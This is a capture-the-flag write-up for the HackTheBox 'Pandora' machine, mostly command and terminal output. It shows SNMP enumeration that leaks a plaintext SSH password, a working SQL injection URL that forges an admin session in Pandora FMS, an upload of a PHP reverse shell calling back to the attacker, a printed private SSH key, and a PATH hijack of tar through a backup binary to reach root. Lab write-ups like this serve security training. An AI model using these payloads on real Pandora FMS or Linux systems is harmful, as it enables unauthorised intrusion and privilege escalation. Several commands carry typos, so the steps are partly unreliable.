<h1> Pandora Hackthebox Writeup </h1>
IP : 10.10.11.136
</br> Found the domain from emails listed on website - panda.htb
</br> Added them to hosts file.

# NMAP SCANNING
## Basic Scan
```
┌──(x4k5h4yx💀Kali)-[~]
└─$ nmap 10.10.11.136    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 23:42 IST
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Udp Scan
```
┌──(x4k5h4yx💀Kali)-[~]
└─$ sudo nmap -sU panda.htb -top-ports=30
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 23:25 IST
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.052s latency).
Not shown: 29 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```
Nmap done: 1 IP address (1 host up) scanned in 25.98 seconds

# Service detection of port 161
```
┌──(x4k5h4yx💀Kali)-[~]
└─$ sudo nmap -sU panda.htb -p 161 -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 23:30 IST
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.052s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
```
# Important Result from Snmp-Check tool
```
┌──(x4k5h4yx💀Kali)-[~]
└─$ snmp-check 10.10.11.136           
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.136:161 using SNMPv1 and community 'public'

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  817                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
```  
# Attempting to connect ssh 
## Succesfully logged in
```
┌──(x4k5h4yx💀Kali)-[~]
└─$ ssh daniel@10.10.11.136
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ED25519) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 10 May 18:14:50 UTC 2022

  System load:           0.0
  Usage of /:            64.8% of 4.87GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:31e5

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue May 10 12:05:29 2022 from 10.10.14.41
daniel@pandora:~$ 
```
# User Flag
### Found out that the userflag.txt is in matt's directory
```
daniel@pandora:/home$ ls -a
.  ..  daniel  matt
daniel@pandora:/home$ cd matt
daniel@pandora:/home/matt$ ls
user.txt
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
```
## Linpeas
### Found that there is another website with name pandora
```
╔══════════╣ Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root root 4.0K Dec  7 14:32 .
drwxr-xr-x 14 root root 4.0K Dec  7 14:32 ..
drwxr-xr-x  3 root root 4.0K Dec  7 14:32 html
drwxr-xr-x  3 matt matt 4.0K Dec  7 14:32 pandora
```
## ETC/HOSTS
### from this we can know that pandora is running on localhost
```
aniel@pandora:/var/www/pandora$ cat /etc/hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora
```
## The following lines are desirable for IPv6 capable hosts
```
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
## Forwarding ssh to localhost to access pandora
```
┌──(x4k5h4yx💀Kali)-[~]
└─$ ssh -D 8080 -C -N daniel@10.10.11.136
daniel@10.10.11.136's password:
```
## Visiting to 127.0.0.1 
### use foxyproxy and change the proxy and port to 12.0.0.1 and 8080 with type socks5.Got the pandora console login page. This version has many vulnerabilities

## SQL Injection
```
https://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```
### and now visit ``` https://127.0.0.1/padora_console``` in the same tab.

## Uploading reverse shell
### Uploading reverse shell https://github.com/pentestmonkey/php-reverse-shell (change the ip and port to our ip and required port) and starting the listener to get shell session .

# Userflag.txt
``` 
$ cd /home/matt
$ cat user.txt 
```

# Root
From the reverse shell session generate ssh keys and save the private key (id_rsa) to our machine.
```
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Created directory '/home/matt/.ssh'.
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:BwOMy6F01ajDC7Lis0Lgrj+UqX6asJ2d7JXyD0abZl0 matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|     +oo         |
|  . + o..        |
| . = +  o        |
|o o *    o       |
|oo + o. S E      |
|oo+ .. = o       |
|*o  . X .        |
|+*o= O .         |
|**Oo= ...        |
+----[SHA256]-----+
$ ls -al
total 36
drwxr-xr-x 5 matt matt 4096 May 13 16:41 .
drwxr-xr-x 4 root root 4096 Dec  7 14:32 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
drwx------ 2 matt matt 4096 May 13 14:26 .cache
drwxrwxr-x 3 matt matt 4096 May 13 14:30 .local
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
drwx------ 2 matt matt 4096 May 13 16:41 .ssh
-rw-r----- 1 root matt   33 May 13 05:01 user.txt
$ cd .ssh
$ ls -al
total 16
drwx------ 2 matt matt 4096 May 13 16:41 .
drwxr-xr-x 5 matt matt 4096 May 13 16:41 ..
-rw------- 1 matt matt 2602 May 13 16:41 id_rsa
-rw-r--r-- 1 matt matt  566 May 13 16:41 id_rsa.pub
$ cat id_rsa.pub > authorized_keys
$ ls -al
total 20
drwx------ 2 matt matt 4096 May 13 16:42 .
drwxr-xr-x 5 matt matt 4096 May 13 16:41 ..
-rw-rw-rw- 1 matt matt  566 May 13 16:42 authorized_keys
-rw------- 1 matt matt 2602 May 13 16:41 id_rsa
-rw-r--r-- 1 matt matt  566 May 13 16:41 id_rsa.pub
$ chmod 600 authorized_keys
$ ls -al
total 20
drwx------ 2 matt matt 4096 May 13 16:42 .
drwxr-xr-x 5 matt matt 4096 May 13 16:41 ..
-rw------- 1 matt matt  566 May 13 16:42 authorized_keys
-rw------- 1 matt matt 2602 May 13 16:41 id_rsa
-rw-r--r-- 1 matt matt  566 May 13 16:41 id_rsa.pub
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
## Copy the id_rsa to our system and get ssh session.
```                                                                                                                                                                                                                                        
┌──(x4k5h4yx💀Kali)-[~/Desktop/HTB/Pandora]
└─$ ssh -i id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 13 May 16:44:35 UTC 2022

  System load:           0.0
  Usage of /:            65.5% of 4.87GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             241
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:77ad

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May 13 14:26:04 2022 from 10.10.14.74
matt@pandora:~$

```
## Privilege Escalation
### I found that vulnerability is TAR and /usr/bin/pandora_backup after downloading it and testing it
```
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: Removing leading `/' from member names
/var/www/pandora/pandora_console/AUTHORS
tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
/var/www/pandora/pandora_console/DB_Dockerfile
/var/www/pandora/pandora_console/DEBIAN/
/var/www/pandora/pandora_console/DEBIAN/md5sums
/var/www/pandora/pandora_console/DEBIAN/conffiles
/var/www/pandora/pandora_console/DEBIAN/control
/var/www/pandora/pandora_console/DEBIAN/make_deb_package.sh
/var/www/pandora/pandora_console/DEBIAN/postinst
/var/www/pandora/pandora_console/Dockerfile
/var/www/pandora/pandora_console/ajax.php
/var/www/pandora/pandora_console/attachment/
```
and the list goes on we need to use this to gain root.

```
matt@pandora:~$ cd /home/matt
matt@pandora:~$ echo "/bin/bash" > tar
matt@pandora:~$ ls -al
total 40
drwxr-xr-x 5 matt matt 4096 May 13 16:46 .
drwxr-xr-x 4 root root 4096 Dec  7 14:32 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
drwx------ 2 matt matt 4096 May 13 14:26 .cache
drwxrwxr-x 3 matt matt 4096 May 13 14:30 .local
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
drwx------ 2 matt matt 4096 May 13 16:42 .ssh
-rw-rw-r-- 1 matt matt   10 May 13 16:46 tar
-rw-r----- 1 root matt   33 May 13 05:01 user.txt
matt@pandora:~$ chmod +x tar
matt@pandora:~$ export PATH=/home/matt/tar:$PATH
matt@pandora:~$ ls -al
total 40
drwxr-xr-x 5 matt matt 4096 May 13 16:46 .
drwxr-xr-x 4 root root 4096 Dec  7 14:32 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
drwx------ 2 matt matt 4096 May 13 14:26 .cache
drwxrwxr-x 3 matt matt 4096 May 13 14:30 .local
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
drwx------ 2 matt matt 4096 May 13 16:42 .ssh
-rwxrwxr-x 1 matt matt   10 May 13 16:46 tar
-rw-r----- 1 root matt   33 May 13 05:01 user.txt
matt@pandora:~$ cat tar
/bin/bash
matt@pandora:~$ export PATH=/home/matt:$PATH
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# whoami
root
root@pandora:~# ls
tar  user.txt
root@pandora:~# cd /root/
root@pandora:/root# ls
root.txt
root@pandora:/root# cat root.txt
```
</br>

Thank YOU <3


